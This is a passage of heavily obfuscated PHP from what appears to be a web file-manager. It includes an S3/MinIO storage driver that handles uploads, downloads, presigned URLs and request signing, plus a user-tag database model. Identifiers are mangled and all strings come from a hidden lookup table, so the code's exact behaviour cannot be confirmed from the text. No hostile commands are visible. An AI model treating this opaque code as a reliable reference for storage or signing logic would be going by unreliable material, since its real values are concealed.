$this->bucket, $Ä¡¨»¡¼, $Ãõ¯“÷½[232], array(), $èÅïÃÈ); if (!$™Î¦©ü²) { return !1; } if ($¿‹¤”ÉÍ) { return !0; } return $™Î¦©ü² ? !0 : !1; } public function fileSubstr($’ÔìÚåù, $Š—“µ—Í, $×çÓ’îÇ) { $›Œ¸‹—Æ = $Š—“µ—Í + $×çÓ’îÇ - 1; return $this->client->getObject($this->bucket, $’ÔìÚåù, array($_SERVER[ÅÄÇĞô][247] => "\142\171\164\x65\x73\x3d{$Š—“µ—Í}\x2d{$›Œ¸‹—Æ}")); } public function upload($§“ç…ÓÄ, $‰ûîõ–÷, $˜íµâşÙ = false, $¨–šÍëğ = REPEAT_REPLACE) { $–Äø–û =& $_SERVER[ÅÄÇĞô]; $çûƒš¸ = array($–Äø–û[248] => @md5_file($‰ûîõ–÷)); $İ‰ŞÓÃà = array($–Äø–û[249] => get_file_mime(get_path_ext($§“ç…ÓÄ))); if (IO::size($‰ûîõ–÷) <= 1024 * 1024 * 200) { $³ÃœÙî = $this->client->putObjectFile($‰ûîõ–÷, $this->bucket, $§“ç…ÓÄ, $–Äø–û[232], $çûƒš¸, $İ‰ŞÓÃà); return !empty($³ÃœÙî) ? $this->getPathOuter($§“ç…ÓÄ) : !1; } $×ÁæÀË = $this->client->multiUploadObject($‰ûîõ–÷, $this->bucket, trim($§“ç…ÓÄ, $–Äø–û[8]), $çûƒš¸, $İ‰ŞÓÃà); return $×ÁæÀË ? $this->getPathOuter($§“ç…ÓÄ) : !1; } public function download($™ÑéÇİ¶, $Ü†ª©•Ê) { if (!@is_dir($this->pathFather($Ü†ª©•Ê)) && !IO::mkdir($this->pathFather($Ü†ª©•Ê))) { return !1; } $‘ÉÊß = $this->client->getObject($this->bucket, $™ÑéÇİ¶, array(), $Ü†ª©•Ê); return $‘ÉÊß !== !1 ? $Ü†ª©•Ê : !1; } public function link($‘¬ß×…­, $•…ûıÇœ = array()) { return $this->getPreSignedURL($‘¬ß×…­, 3600 * 12, $•…ûıÇœ); } private function getPreSignedURL($·Å‡âÆë, $ßÙ’¾·„, $©œ»Â€õ = array(), $È€­ˆ÷š = "\x47\105\x54") { $Õì™ã„ƒ =& $_SERVER[ÅÄÇĞô]; $·Å‡âÆë = trim($·Å‡âÆë, $Õì™ã„ƒ[8]); if ($this->signVer == $Õì™ã„ƒ[250]) { return $this->client->getPreSignedV2URL($this->bucket, $·Å‡âÆë, $ßÙ’¾·„, $È€­ˆ÷š, $©œ»Â€õ); } return $this->client->getPreSignedV4URL($this->bucket, $·Å‡âÆë, $ßÙ’¾·„, array(), $È€­ˆ÷š, $©œ»Â€õ); } public function fileOut($¡ùùœ€, $şßß‚ = false, $›¤„Ö½à = false, $Ê ĞêŞ¶ = '') { $™ŒÆØîØ =& $_SERVER[ÅÄÇĞô]; if ($this->isFileOutServer()) { return $this->fileOutServer($¡ùùœ€, $şßß‚, $›¤„Ö½à, $Ê ĞêŞ¶); } if (!$›¤„Ö½à) { $›¤„Ö½à = $this->pathThis($¡ùùœ€); } $×ÀÀÜ¦Ã = get_file_mime(get_path_ext($›¤„Ö½à)); if ($×ÀÀÜ¦Ã == $™ŒÆØîØ[251]) { return parent::fileOut($¡ùùœ€, $şßß‚, $›¤„Ö½à, $Ê ĞêŞ¶); } $óµ¤»  = array($™ŒÆØîØ[252] => $×ÀÀÜ¦Ã); if ($şßß‚) { $óµ¤» [$™ŒÆØîØ[253]] = $™ŒÆØîØ[254] . rawurlencode($›¤„Ö½à); } else { } $½²¬­ßá = $this->link($¡ùùœ€, $óµ¤» ); $this->fileOutLink($½²¬­ßá); } public function fileOutServer($¥…¨¸ê•, $ë«Ø†¢ = false, $µ—¢Ä‚Å = false, $øıàª„Ç = '') { parent::fileOut($¥…¨¸ê•, $ë«Ø†¢, $µ—¢Ä‚Å, $øıàª„Ç); } public function fileOutImageServer($œã²ÏÙ, $åïËŸÊ = 250) { parent::fileOutImage($œã²ÏÙ, $åïËŸÊ); } public function hashMd5($ş¡ÒâÃ, $ÅÆ¦ˆÚÊ = '') { $îÖÍ¶¬ê = $this->objectMeta($ş¡ÒâÃ); if (!$îÖÍ¶¬ê) { return !1; } $ÅÆ¦ˆÚÊ = $ÅÆ¦ˆÚÊ ? $ÅÆ¦ˆÚÊ : _get($îÖÍ¶¬ê, $_SERVER[ÅÄÇĞô][255]); return $ÅÆ¦ˆÚÊ; } public function uploadFormData($Š» ¶¬Õ, $ëÄ“æÔÊ = 3600) { $’é¶×ü‹ =& $_SERVER[ÅÄÇĞô]; if (!$this->_isClientAsync()) { $ï›¾ßıä = $this->getPreSignedURL($Š» ¶¬Õ, $ëÄ“æÔÊ, array(), $’é¶×ü‹[256]); return array($’é¶×ü‹[209] => str_replace($’é¶×ü‹[219], $’é¶×ü‹[257], $ï›¾ßıä)); } if (isset($GLOBALS[$’é¶×ü‹[6]][$’é¶×ü‹[92]][$’é¶×ü‹[258]]) && $GLOBALS[$’é¶×ü‹[6]][$’é¶×ü‹[92]][$’é¶×ü‹[258]] == $’é¶×ü‹[231]) { return $this->uploadMultiData($Š» ¶¬Õ, $ëÄ“æÔÊ); } if ($this->signVer == $’é¶×ü‹[250]) { return $this->uploadFormDataV2($Š» ¶¬Õ, $ëÄ“æÔÊ); } return $this->uploadFormDataV4($Š» ¶¬Õ, $ëÄ“æÔÊ); } public function uploadFormDataV2($ÉĞöŒğÛ, $†¢—í¼› = 3600) { $ÌèÛ“¤ =& $_SERVER[ÅÄÇĞô]; $ãñÔ³÷ = $this->pathFather($ÉĞöŒğÛ); $é“‡ƒì× = $this->client->getHttpUploadPostParams($this->bucket, $ãñÔ³÷, $ÌèÛ“¤[232], $†¢—í¼›); $Ë“µ¥•• = array_merge((array) $é“‡ƒì×, array($ÌèÛ“¤[259] => $ÌèÛ“¤[250], $ÌèÛ“¤[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($Ë“µ¥••[$ÌèÛ“¤[259]]); } return $Ë“µ¥••; } public function uploadFormDataV4($äÀğş·, $ú³š¤¦Ö = 3600) { $Ë™¤µÔ¢ =& $_SERVER[ÅÄÇĞô]; $â˜­“¾± = $Ë™¤µÔ¢[232]; $Õı‡¬¿ñ = $Ë™¤µÔ¢[260]; $×ìşÔ ’ = $Ë™¤µÔ¢[62]; $Öê›²ã = gmdate($Ë™¤µÔ¢[261]); $£ˆÏš = gmdate($Ë™¤µÔ¢[262]); $ñÉƒßáÈ = $Ë™¤µÔ¢[263]; $íŸÓ„ÈÀ = $ú³š¤¦Ö . $Ë™¤µÔ¢[12]; $áéï­Ğå = $Ë™¤µÔ¢[264]; $®ô¯…òŒ = array($this->accessKey, $£ˆÏš, $this->region, $×ìşÔ ’, $ñÉƒßáÈ); $­ö´ä = implode($Ë™¤µÔ¢[8], $®ô¯…òŒ); $œË¾ûøæ = array($Ë™¤µÔ¢[265] => gmdate($Ë™¤µÔ¢[266], strtotime($Ë™¤µÔ¢[267])), $Ë™¤µÔ¢[268] => array(array($Ë™¤µÔ¢[269] => $this->bucket), array($Ë™¤µÔ¢[270], $Ë™¤µÔ¢[271], $Ë™¤µÔ¢[12]), array($Ë™¤µÔ¢[270], $Ë™¤µÔ¢[272], $Ë™¤µÔ¢[12]), array($Ë™¤µÔ¢[273] => $áéï­Ğå), array($Ë™¤µÔ¢[274] => $­ö´ä), array($Ë™¤µÔ¢[275] => $Õı‡¬¿ñ), array($Ë™¤µÔ¢[276] => $Öê›²ã), array($Ë™¤µÔ¢[277] => $íŸÓ„ÈÀ))); $ûê­Êä« = base64_encode(json_encode($œË¾ûøæ)); $ù˜šÓ = hash_hmac($Ë™¤µÔ¢[278], $£ˆÏš, $Ë™¤µÔ¢[279] . $this->secret, !0); $œ¦øÉŸï = hash_hmac($Ë™¤µÔ¢[278], $this->region, $ù˜šÓ, !0); $–èÛ¹í† = hash_hmac($Ë™¤µÔ¢[278], $×ìşÔ ’, $œ¦øÉŸï, !0); $»Õ×üü‘ = hash_hmac($Ë™¤µÔ¢[278], $ñÉƒßáÈ, $–èÛ¹í†, !0); $£Ì¾™ĞÏ = hash_hmac($Ë™¤µÔ¢[278], $ûê­Êä«, $»Õ×üü‘); $ßùùËØ = array($Ë™¤µÔ¢[249] => $Ë™¤µÔ¢[12], $Ë™¤µÔ¢[273] => $áéï­Ğå, $Ë™¤µÔ¢[280] => $ûê­Êä«, $Ë™¤µÔ¢[274] => $­ö´ä, $Ë™¤µÔ¢[275] => $Õı‡¬¿ñ, $Ë™¤µÔ¢[276] => $Öê›²ã, $Ë™¤µÔ¢[277] => $íŸÓ„ÈÀ, $Ë™¤µÔ¢[281] => $£Ì¾™ĞÏ, $Ë™¤µÔ¢[259] => $Ë™¤µÔ¢[250], $Ë™¤µÔ¢[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($ßùùËØ[$Ë™¤µÔ¢[259]]); } return $ßùùËØ; } public function uploadMultiData($ƒñË–ï…, $Ü¸í³…š = 3600) { $±¹›öÇ‚ =& $_SERVER[ÅÄÇĞô]; $íè»Øø = $this->signVer == $±¹›öÇ‚[250] ? gmdate($±¹›öÇ‚[282]) : gmdate($±¹›öÇ‚[283]); $·íöêËµ = array(); $æ×¤ÍÊı = $this->client->getUploadId($this->bucket, $ƒñË–ï…, $·íöêËµ); if (!$æ×¤ÍÊı) { return !1; } $€“æƒô‘ = array($±¹›öÇ‚[284] => $æ×¤ÍÊı, $±¹›öÇ‚[209] => $this->getHost() . $±¹›öÇ‚[8] . $this->pathEncode($ƒñË–ï…), $±¹›öÇ‚[285] => $íè»Øø, $±¹›öÇ‚[97] => $ƒñË–ï…, $±¹›öÇ‚[259] => $this->signVer); if ($this->_isClientAsync()) { unset($€“æƒô‘[$±¹›öÇ‚[259]]); } return $€“æƒô‘; } public function uploadMultiAuth($‰“î¦Å¹, $€“‰¥¶À = array()) { $ˆšÒ€ÔÍ =& $_SERVER[ÅÄÇĞô]; if ($this->signVer == $ˆšÒ€ÔÍ[250]) { if (isset($€“‰¥¶À[$ˆšÒ€ÔÍ[286]])) { return $this->uploadPartAuthV2($‰“î¦Å¹, $€“‰¥¶À); } return $this->uploadListAuthV2($‰“î¦Å¹, $€“‰¥¶À); } if (isset($€“‰¥¶À[$ˆšÒ€ÔÍ[286]])) { return $this->uploadPartAuthV4($‰“î¦Å¹, $€“‰¥¶À); } return $this->uploadListAuthV4($‰“î¦Å¹, $€“‰¥¶À); } public function uploadPartAuthV2($çóíì°À, $Æø‚»’ˆ = array()) { $¼Â™˜¸ =& $_SERVER[ÅÄÇĞô]; $°Æ™ØÇ = $Æø‚»’ˆ[$¼Â™˜¸[97]]; $Û•óŠù‚ = gmdate($¼Â™˜¸[282]); $ÃÕáÔ“Ÿ = array_intersect_key($Æø‚»’ˆ, array_flip(array($¼Â™˜¸[286], $¼Â™˜¸[284]))); ksort($ÃÕáÔ“Ÿ); $ÎÀş¶ˆ = $ÃÕáÔ“Ÿ ? $¼Â™˜¸[76] . http_build_query($ÃÕáÔ“Ÿ, null, $¼Â™˜¸[287], PHP_QUERY_RFC3986) : $¼Â™˜¸[12]; $†ğæ˜¤ü = array($¼Â™˜¸[256], $¼Â™˜¸[12], $¼Â™˜¸[123], $¼Â™˜¸[12], "\x78\55\x61\x6d\172\55\x64\141\x74\145\x3a{$Û•óŠù‚}", $¼Â™˜¸[8] . $this->bucket . $¼Â™˜¸[8] . $this->pathEncode($°Æ™ØÇ) . $ÎÀş¶ˆ); $‚Ö¸‚¥· = implode($¼Â™˜¸[288], $†ğæ˜¤ü); $ïŞ×Ç¿æ = $this->client->__getSignature($‚Ö¸‚¥·); return array($¼Â™˜¸[289] => $ïŞ×Ç¿æ, $¼Â™˜¸[285] => $Û•óŠù‚); } public function uploadListAuthV2($É××ò€, $…ÉŠ·ÚĞ = array()) { $÷Ãôú„Ÿ =& $_SERVER[ÅÄÇĞô]; $‚ÜÑ¨˜ = $…ÉŠ·ÚĞ[$÷Ãôú„Ÿ[97]]; $ÕÁÁú†® = $…ÉŠ·ÚĞ[$÷Ãôú„Ÿ[284]]; $ˆì©Î·ã = $this->client->listParts($this->bucket, $‚ÜÑ¨˜, $ÕÁÁú†®); if (!$ˆì©Î·ã) { return !1; } $ª·Ö©ÕÌ = gmdate($÷Ãôú„Ÿ[282]); $Ç¯Ø¶â = $÷Ãôú„Ÿ[290] . $ÕÁÁú†®; $ıÕ—â‘ = array($÷Ãôú„Ÿ[291], $÷Ãôú„Ÿ[12], $÷Ãôú„Ÿ[123], $÷Ãôú„Ÿ[12], "\170\x2d\x61\155\172\55\x64\x61\164\145\72{$ª·Ö©ÕÌ}", $÷Ãôú„Ÿ[8] . $this->bucket . $÷Ãôú„Ÿ[8] . $this->pathEncode($‚ÜÑ¨˜) . $Ç¯Ø¶â); $¯™ÙÖ»â = implode($÷Ãôú„Ÿ[288], $ıÕ—â‘); $á¾³Ï‚Â = $this->client->__getSignature($¯™ÙÖ»â); return array($÷Ãôú„Ÿ[289] => $á¾³Ï‚Â, $÷Ãôú„Ÿ[285] => $ª·Ö©ÕÌ, $÷Ãôú„Ÿ[292] => $ˆì©Î·ã); } public function uploadPartAuthV4($®ƒ³æˆ…, $ÚÙòÕÆØ = array()) { $—ƒ™¼ ¹ =& $_SERVER[ÅÄÇĞô]; $ÀÄœÒ»‚ = $ÚÙòÕÆØ[$—ƒ™¼ ¹[97]]; $ç…×é˜ü = array($—ƒ™¼ ¹[276] => gmdate($—ƒ™¼ ¹[283]), $—ƒ™¼ ¹[293] => _get($ÚÙòÕÆØ, $—ƒ™¼ ¹[294], hash($—ƒ™¼ ¹[278], $—ƒ™¼ ¹[12]))); $ ¸Ù­“ = explode($—ƒ™¼ ¹[211], $this->getHost()); $™Ğà–’É = array($—ƒ™¼ ¹[295] => $ ¸Ù­“[1], $—ƒ™¼ ¹[296] => $—ƒ™¼ ¹[12], $—ƒ™¼ ¹[249] => $—ƒ™¼ ¹[123], $—ƒ™¼ ¹[297] => $ÚÙòÕÆØ[$—ƒ™¼ ¹[79]]); $§‹âŸáİ = $—ƒ™¼ ¹[256]; $†ş”§İ— = $—ƒ™¼ ¹[8] . $this->pathEncode($ÀÄœÒ»‚); $ùšƒÎŸ = array_intersect_key($ÚÙòÕÆØ, array_flip(array($—ƒ™¼ ¹[286], $—ƒ™¼ ¹[284]))); $³Œ€Şƒ¤ = $this->client->__getSignatureV4($ç…×é˜ü, $™Ğà–’É, $§‹âŸáİ, $†ş”§İ—, $ùšƒÎŸ); return array($—ƒ™¼ ¹[289] => $³Œ€Şƒ¤, $—ƒ™¼ ¹[293] => $ç…×é˜ü[$—ƒ™¼ ¹[293]], $—ƒ™¼ ¹[285] => $ç…×é˜ü[$—ƒ™¼ ¹[276]]); } public function uploadListAuthV4($ÉÍî¹Ó, $áŞê¦Å = array()) { $şóøÍô° =& $_SERVER[ÅÄÇĞô]; $Õ†Îù¹¦ = $áŞê¦Å[$şóøÍô°[97]]; $ô åÚéÛ = $áŞê¦Å[$şóøÍô°[284]]; $òğ§ö‚ = $this->client->listParts($this->bucket, $Õ†Îù¹¦, $ô åÚéÛ); if (!$òğ§ö‚) { return !1; } $êö›¶ÖÓ = $şóøÍô°[298]; foreach ($òğ§ö‚ as $öàöï‘) { $êö›¶ÖÓ .= $şóøÍô°[299] . "\x3c\x50\141\162\x74\116\165\x6d\142\x65\x72\x3e{$öàöï‘[$şóøÍô°[300]]}\74\x2f\x50\x61\162\x74\x4e\165\x6d\142\145\x72\76\xa" . "\74\x45\124\141\x67\x3e{$öàöï‘[$şóøÍô°[301]]}\x3c\x2f\105\124\141\x67\76\xa" . $şóøÍô°[302]; } $êö›¶ÖÓ .= $şóøÍô°[303]; $¬²å—“ = array($şóøÍô°[276] => gmdate($şóøÍô°[283]), $şóøÍô°[293] => hash($şóøÍô°[278], $êö›¶ÖÓ)); $‡ŒÍÒ»° = explode($şóøÍô°[211], $this->getHost()); $¸ß‰’º„ = array($şóøÍô°[295] => $‡ŒÍÒ»°[1], $şóøÍô°[249] => $şóøÍô°[123], $şóøÍô°[297] => strlen($êö›¶ÖÓ)); $â¼ÅşÆ = $şóøÍô°[291]; $ŞçöìŠà = $şóøÍô°[8] . $this->pathEncode($Õ†Îù¹¦); $ÈÛÑ¬£ = array($şóøÍô°[284] => $ô åÚéÛ); $°î¤‰Ç = $this->client->__getSignatureV4($¬²å—“, $¸ß‰’º„, $â¼ÅşÆ, $ŞçöìŠà, $ÈÛÑ¬£); return array($şóøÍô°[289] => $°î¤‰Ç, $şóøÍô°[293] => $¬²å—“[$şóøÍô°[293]], $şóøÍô°[285] => $¬²å—“[$şóøÍô°[276]], $şóøÍô°[292] => $òğ§ö‚); } private function _isClientAsync() { $°„şÎï =& $_SERVER[ÅÄÇĞô]; static $‰à¬€óÍ = null; if ($‰à¬€óÍ === null) { $Ô¯ª—’¢ = isset($_REQUEST[$°„şÎï[304]]) ? json_decode($_REQUEST[$°„şÎï[304]], !0) : !1; $‰à¬€óÍ = $Ô¯ª—’¢ && _get($Ô¯ª—’¢, $°„şÎï[305]) == $°„şÎï[306]; } return $‰à¬€óÍ; } public function getHost() { $›‘­¾´‹ =& $_SERVER[ÅÄÇĞô]; $×¼ˆÅş” = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($›‘­¾´‹[70], $›‘­¾´‹[64], $›‘­¾´‹[69], $›‘­¾´‹[62]))) { return $×¼ˆÅş” . $›‘­¾´‹[8] . $this->bucket; } if ($this->osType == $›‘­¾´‹[62] && !is_domain($×¼ˆÅş”)) { return $×¼ˆÅş” . $›‘­¾´‹[8] . $this->bucket; } $×¼ˆÅş” = explode($›‘­¾´‹[211], $×¼ˆÅş”); return $×¼ˆÅş”[0] . $›‘­¾´‹[211] . $this->bucket . $›‘­¾´‹[10] . $×¼ˆÅş”[1]; } public function size($Ï¡Åë…“) { $÷ÖÎ¬ñë = $this->objectMeta($Ï¡Åë…“); return $÷ÖÎ¬ñë ? $÷ÖÎ¬ñë[$_SERVER[ÅÄÇĞô][79]] : 0; } public function info($æ«Åî§÷) { if ($this->isFolder($æ«Åî§÷)) { return $this->folderInfo($æ«Åî§÷); } else { if ($this->isFile($æ«Åî§÷)) { return $this->fileInfo($æ«Åî§÷); } } return !1; } public function exist($‘…Ü–®³) { return $this->isFile($‘…Ü–®³) || $this->isFolder($‘…Ü–®³); } public function isFile($¿Á¢Ûä³) { return !$this->isFolder($¿Á¢Ûä³) && $this->objectMeta($¿Á¢Ûä³); } public function isFolder($é§³ÈÓ) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][180], $é§³ÈÓ); } protected function objectMeta($³¼û§Ğæ) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][182], $³¼û§Ğæ); } protected function _objectMeta($Ùş¼›¶ø) { $Ë®•‚û˜ =& $_SERVER[ÅÄÇĞô]; $Ùş¼›¶ø = rtrim($Ùş¼›¶ø, $Ë®•‚û˜[8]); try { $ì´Œ–Ä¾ = $this->client->getObjectInfo($this->bucket, $Ùş¼›¶ø); if (!isset($ì´Œ–Ä¾[$Ë®•‚û˜[255]]) && isset($ì´Œ–Ä¾[$Ë®•‚û˜[307]])) { $ì´Œ–Ä¾[$Ë®•‚û˜[255]] = $ì´Œ–Ä¾[$Ë®•‚û˜[307]]; } } catch (Exception $òçÓú¾È) { $ì´Œ–Ä¾ = !1; } if (!$ì´Œ–Ä¾) { } return $ì´Œ–Ä¾; } protected function _isFolder($ªâ³ Ú) { $ÂôÕ»¹ñ =& $_SERVER[ÅÄÇĞô]; $ªâ³ Ú = rtrim($ªâ³ Ú, $ÂôÕ»¹ñ[8]) . $ÂôÕ»¹ñ[8]; if ($ªâ³ Ú == $ÂôÕ»¹ñ[12] || $ªâ³ Ú == $ÂôÕ»¹ñ[8]) { return !0; } $Õ¾ÆÀÆˆ = $this->client->getBucket($this->bucket, $ªâ³ Ú, null, 1); if (empty($Õ¾ÆÀÆˆ[$ÂôÕ»¹ñ[239]])) { return !1; } $ô»¤ø“ğ = $Õ¾ÆÀÆˆ[$ÂôÕ»¹ñ[239]][0][$ÂôÕ»¹ñ[32]]; return stripos($ô»¤ø“ğ, $ªâ³ Ú) === 0 ? !0 : !1; if (substr($ô»¤ø“ğ, -1) == $ÂôÕ»¹ñ[8]) { return !0; } if (get_path_this($ô»¤ø“ğ) == get_path_this($ªâ³ Ú)) { return !1; } return !0; } public function listObject($˜ÁÖ¢ó) { return $this->fileList($˜ÁÖ¢ó, $_SERVER[ÅÄÇĞô][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¢ó‡Û‹å) { $çˆ¦Â×Ÿ =& $_SERVER[ÅÄÇĞô]; parent::__construct($¢ó‡Û‹å); $this->setSignVersion($çˆ¦Â×Ÿ[250]); if (!$this->region) { $this->region = $çˆ¦Â×Ÿ[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $—ã«Ô‘× = $this->getBktRegion(); return $this->region == $—ã«Ô‘× ? !0 : !1; } public function uploadFormData($³ãÂ½—‹, $û·‰‰çÄ = 3600) { $¥ã¶÷£Ï =& $_SERVER[ÅÄÇĞô]; $ß„üğ½³ = $¥ã¶÷£Ï[232]; $Üæú’ªÊ = $¥ã¶÷£Ï[260]; $Ä‹…ƒÍÇ = $¥ã¶÷£Ï[62]; $ñÌ½ÎÕç = gmdate($¥ã¶÷£Ï[261]); $ˆşœ«ûÇ = gmdate($¥ã¶÷£Ï[262]); $à ¨¯– = $¥ã¶÷£Ï[263]; $î˜ó¨ä  = $û·‰‰çÄ . $¥ã¶÷£Ï[12]; $˜ô¥à¶“ = $¥ã¶÷£Ï[264]; $”İÌˆÙ = array($this->accessKey, $ˆşœ«ûÇ, $this->region, $Ä‹…ƒÍÇ, $à ¨¯–); $ëæìõÚ = implode($¥ã¶÷£Ï[8], $”İÌˆÙ); $ˆ‰Ï€ = array($¥ã¶÷£Ï[265] => gmdate($¥ã¶÷£Ï[266], strtotime($¥ã¶÷£Ï[267])), $¥ã¶÷£Ï[268] => array(array($¥ã¶÷£Ï[269] => $this->bucket), array($¥ã¶÷£Ï[309] => $ß„üğ½³), array($¥ã¶÷£Ï[270], $¥ã¶÷£Ï[271], $¥ã¶÷£Ï[12]), array($¥ã¶÷£Ï[270], $¥ã¶÷£Ï[272], $¥ã¶÷£Ï[12]), array($¥ã¶÷£Ï[270], $¥ã¶÷£Ï[310], $¥ã¶÷£Ï[12]), array($¥ã¶÷£Ï[273] => $˜ô¥à¶“), array($¥ã¶÷£Ï[274] => $ëæìõÚ), array($¥ã¶÷£Ï[275] => $Üæú’ªÊ), array($¥ã¶÷£Ï[276] => $ñÌ½ÎÕç), array($¥ã¶÷£Ï[277] => $î˜ó¨ä ))); $Î­Öß–ı = base64_encode(json_encode($ˆ‰Ï€)); $ºû¸™ß‘ = hash_hmac($¥ã¶÷£Ï[278], $ˆşœ«ûÇ, $¥ã¶÷£Ï[279] . $this->secret, !0); $°¤ê°äé = hash_hmac($¥ã¶÷£Ï[278], $this->region, $ºû¸™ß‘, !0); $ê£†Õûà = hash_hmac($¥ã¶÷£Ï[278], $Ä‹…ƒÍÇ, $°¤ê°äé, !0); $ÈÕÓ ­ı = hash_hmac($¥ã¶÷£Ï[278], $à ¨¯–, $ê£†Õûà, !0); $ƒğÔÀ = hash_hmac($¥ã¶÷£Ï[278], $Î­Öß–ı, $ÈÕÓ ­ı); $šß®–‚ä = array($¥ã¶÷£Ï[249] => $¥ã¶÷£Ï[12], $¥ã¶÷£Ï[297] => $¥ã¶÷£Ï[12], $¥ã¶÷£Ï[309] => $ß„üğ½³, $¥ã¶÷£Ï[273] => $˜ô¥à¶“, $¥ã¶÷£Ï[280] => $Î­Öß–ı, $¥ã¶÷£Ï[311] => $ëæìõÚ, $¥ã¶÷£Ï[312] => $Üæú’ªÊ, $¥ã¶÷£Ï[313] => $ñÌ½ÎÕç, $¥ã¶÷£Ï[314] => $î˜ó¨ä , $¥ã¶÷£Ï[315] => $ƒğÔÀ, $¥ã¶÷£Ï[209] => $this->getHost()); return $šß®–‚ä; } } goto Aæ»¿“Í; f§È›¶•ÊÂ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ç÷ÄÏ¼Õ) { $êüœ–ôì =& $_SERVER[ÅÄÇĞô]; return array($êüœ–ôì[2113] => array($êüœ–ôì[2542] . USER_ID, $êüœ–ôì[2114])); } protected function listData() { $ÉÈèÇÓá =& $_SERVER[ÅÄÇĞô]; $´¿İÊÀà = array($ÉÈèÇÓá[1788] => USER_ID, $ÉÈèÇÓá[562] => array($ÉÈèÇÓá[2117], 0)); $‰²¾ª‰ = $ÉÈèÇÓá[2543]; $ÔØ››†× = $this->field($‰²¾ª‰)->where($´¿İÊÀà)->order($ÉÈèÇÓá[2120])->select(); return $ÔØ››†× ? $ÔØ››†× : array(); } protected function addToTag($é‹šŸ»’, $ªç“Ïâ¤) { $Å¯ºß‹ó =& $_SERVER[ÅÄÇĞô]; if (!Model($Å¯ºß‹ó[2270])->listData($ªç“Ïâ¤)) { return !1; } if (is_numeric($é‹šŸ»’)) { $¨‡ñ¶ÔŠ = Model($Å¯ºß‹ó[925])->pathInfo($é‹šŸ»’); if (!$¨‡ñ¶ÔŠ) { return !1; } } else { $¨‡ñ¶ÔŠ = IO::infoSimple($é‹šŸ»’); if (!$¨‡ñ¶ÔŠ) { return !1; } $‹º·ä÷¤ = $¨‡ñ¶ÔŠ[$Å¯ºß‹ó[32]]; $ö®ıŸÅö = $¨‡ñ¶ÔŠ[$Å¯ºß‹ó[33]]; if (isset($¨‡ñ¶ÔŠ[$Å¯ºß‹ó[488]])) { $ö®ıŸÅö = $¨‡ñ¶ÔŠ[$Å¯ºß‹ó[488]] == $Å¯ºß‹ó[91] ? $Å¯ºß‹ó[78] : $Å¯ºß‹ó[233]; } } $Ÿü€’¾ = array($Å¯ºß‹ó[1788] => USER_ID, $Å¯ºß‹ó[562] => $ªç“Ïâ¤, $Å¯ºß‹ó[498] => $é‹šŸ»’, $Å¯ºß‹ó[499] => $ö®ıŸÅö ? $ö®ıŸÅö : $Å¯ºß‹ó[493], $Å¯ºß‹ó[497] => $‹º·ä÷¤ ? $‹º·ä÷¤ : $Å¯ºß‹ó[12], $Å¯ºß‹ó[2002] => 0); if ($this->where($Ÿü€’¾)->find()) { return !1; } return $this->add($Ÿü€’¾); } protected function removeFromTag($²±ğ²‹û, $ç¾Å‘) { $Û¾Ç¯ÀØ =& $_SERVER[ÅÄÇĞô]; if (!Model($Û¾Ç¯ÀØ[2270])->listData($ç¾Å‘)) { return !1; } if (is_array($²±ğ²‹û)) { $²±ğ²‹û = array($Û¾Ç¯ÀØ[7], $²±ğ²‹û); } $ê¶‚ˆ§Ò = array($Û¾Ç¯ÀØ[1788] => USER_ID, $Û¾Ç¯ÀØ[562] => $ç¾Å‘, $Û¾Ç¯ÀØ[498] => $²±ğ²‹û); return $this->where($ê¶‚ˆ§Ò)->delete(); } protected function removeByTag($ŞÕ¾‹ÍË) { $à¦áÔŠÃ =& $_SERVER[ÅÄÇĞô]; if (!$ŞÕ¾‹ÍË) { return !1; } $ç¾‡€ÊŠ = array($à¦áÔŠÃ[1788] => USER_ID, $à¦áÔŠÃ[562] => $ŞÕ¾‹ÍË); return $this->where($ç¾‡€ÊŠ)->delete(); } protected function removeBySource($ß…óš‹) { $ Úç™“ó =& $_SERVER[ÅÄÇĞô]; if (is_array($ß…óš‹)) { $ß…óš‹ = array($ Úç™“ó[7], $ß…óš‹); } $¨¦š–í³ = array($ Úç™“ó[1788] => USER_ID, $ Úç™“ó[562] => array($ Úç™“ó[1114], 0), $ Úç™“ó[498] => $ß…óš‹); return $this->where($¨¦š–í³)->delete(); } }